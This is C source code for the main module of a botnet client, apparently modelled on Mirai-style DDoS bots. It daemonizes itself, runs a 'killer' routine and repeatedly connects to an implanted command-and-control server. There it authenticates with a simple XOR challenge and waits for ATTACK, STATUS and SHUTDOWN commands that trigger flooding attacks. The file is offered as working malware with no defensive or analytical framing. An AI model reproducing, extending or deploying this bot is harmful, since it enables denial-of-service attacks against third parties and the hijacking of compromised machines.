#include "bot.h"
#include "attack_methods.h"  // Add this include
#include "command_handler.h"
#include "ascii_art.h"
#include "killer.h"
#include "daemon.h"
#include "network_utils.h"
#include "config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <time.h>

// Global variables (defined here only once)
volatile int running = 1;
volatile int attack_active = 0;
int main_pid = 0;
int watcher_pid = 0;
int attack_ongoing[10] = {0};
int cnc_port = CNC_PORT;

// Statistics
volatile long long total_attacks = 0;
volatile long long total_packets = 0;
volatile long long total_bytes = 0;

// Attack statistics (defined here for attack_methods.c to use via extern)
volatile long long total_packets_sent = 0;
volatile long long total_bytes_sent = 0;
volatile int active_threads = 0;

// Rest of bot.c code remains the same...
void signal_handler(int sig) {
    (void)sig; // Silence unused parameter warning
    printf("\n\033[1;33m[*] Received shutdown signal...\033[0m\n");
    running = 0;
    attack_active = 0;
}

void print_bot_info() {
    printf("\033[1;36m");
    printf("┌─────────────────────── BOT INFORMATION ───────────────────────┐\n");
    printf("│ PID:          %-40d │\n", getpid());
    printf("│ Parent PID:   %-40d │\n", getppid());
    printf("│ UID/GID:      %-40d │\n", getuid());
    printf("│ Attacks:      %-40lld │\n", total_attacks);
    printf("│ Packets:      %-40lld │\n", total_packets);
    printf("│ Bytes:        %-40lld │\n", total_bytes);
    printf("│ Status:       %-40s │\n", attack_active ? "ATTACKING" : "READY");
    printf("└────────────────────────────────────────────────────────────────┘\n");
    printf("\033[0m");
}

int authenticate_bot(int sockfd) {
    char buffer[256];
    char challenge[64];
    char response[64];
    
    // Generate challenge
    snprintf(challenge, sizeof(challenge), "AUTH-%ld-%d", time(NULL), getpid());
    
    // Send challenge
    if(send(sockfd, challenge, strlen(challenge), 0) <= 0) {
        return 0;
    }
    
    // Receive response
    int bytes = recv(sockfd, buffer, sizeof(buffer)-1, 0);
    if(bytes <= 0) return 0;
    buffer[bytes] = 0;
    
    // Simple XOR authentication
    size_t challenge_len = strlen(challenge);
    for(size_t i = 0; i < challenge_len; i++) {
        response[i] = challenge[i] ^ 0x55;
    }
    response[challenge_len] = 0;
    
    if(strcmp(buffer, response) == 0) {
        send(sockfd, "AUTH_OK", 7, 0);
        return 1;
    }
    
    return 0;
}

void* command_listener(void* socket_ptr) {
    int sockfd = *(int*)socket_ptr;
    char buffer[1024];
    
    while(running) {
        int bytes = recv(sockfd, buffer, sizeof(buffer)-1, 0);
        if(bytes <= 0) {
            printf("\033[1;31m[!] Connection lost to C&C server\033[0m\n");
            break;
        }
        
        buffer[bytes] = 0;
        
        if(strncmp(buffer, "ATTACK", 6) == 0) {
            printf("\033[1;35m[*] Received attack command\033[0m\n");
            execute_attack_command(buffer);
            total_attacks++;
        }
        else if(strcmp(buffer, "STATUS") == 0) {
            char status[256];
            snprintf(status, sizeof(status), "STATUS: PID=%d, Attacks=%lld, Packets=%lld, Bytes=%lld", 
                    getpid(), total_attacks, total_packets, total_bytes);
            send(sockfd, status, strlen(status), 0);
        }
        else if(strcmp(buffer, "INFO") == 0) {
            print_bot_info();
        }
        else if(strcmp(buffer, "PING") == 0) {
            send(sockfd, "PONG", 4, 0);
        }
        else if(strcmp(buffer, "SHUTDOWN") == 0) {
            printf("\033[1;33m[*] Received shutdown command\033[0m\n");
            running = 0;
            break;
        }
        else {
            printf("\033[1;31m[!] Unknown command: %s\033[0m\n", buffer);
        }
    }
    
    close(sockfd);
    return NULL;
}

void connect_to_cnc(const char* cnc_ip, int cnc_port) {
    printf("\033[1;36m[*] Connecting to C&C server at %s:%d\033[0m\n", cnc_ip, cnc_port);
    
    while(running) {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if(sockfd < 0) {
            perror("Socket creation failed");
            sleep(10);
            continue;
        }
        
        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(cnc_port);
        inet_pton(AF_INET, cnc_ip, &serv_addr.sin_addr);
        
        // Set socket timeout
        struct timeval timeout;
        timeout.tv_sec = 10;
        timeout.tv_usec = 0;
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
        setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
        
        if(connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
            printf("\033[1;31m[!] Failed to connect to C&C server. Retrying in 30 seconds...\033[0m\n");
            close(sockfd);
            sleep(30);
            continue;
        }
        
        printf("\033[1;32m[+] Connected to C&C server. Authenticating...\033[0m\n");
        
        if(authenticate_bot(sockfd)) {
            printf("\033[1;32m[+] Authentication successful!\033[0m\n");
            
            pthread_t listener_thread;
            pthread_create(&listener_thread, NULL, command_listener, &sockfd);
            pthread_join(listener_thread, NULL);
        } else {
            printf("\033[1;31m[!] Authentication failed\033[0m\n");
            close(sockfd);
        }
        
        printf("\033[1;33m[*] Reconnecting in 10 seconds...\033[0m\n");
        sleep(10);
    }
}

int main(int argc, char *argv[]) {
    // Use implanted C&C server details
    const char* cnc_ip = CNC_SERVER;
    cnc_port = CNC_PORT;
    
    printf("Starting bot with implanted C&C: %s:%d\n", cnc_ip, cnc_port);
    
    // Set global variables
    main_pid = getpid();
    
    // Set signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Show banner
    print_banner();
    print_loading(2);
    
    // Daemonize the bot
    daemonize(argc, argv);
    
    // Update PID after daemonization
    main_pid = getpid();
    
    // Start killer protection
    printf("\033[1;33m[*] Starting security systems...\033[0m\n");
    killer_main();
    
    // Connect to C&C server
    connect_to_cnc(cnc_ip, cnc_port);
    
    printf("\033[1;31m[!] Bot shutting down...\033[0m\n");
    return 0;
}
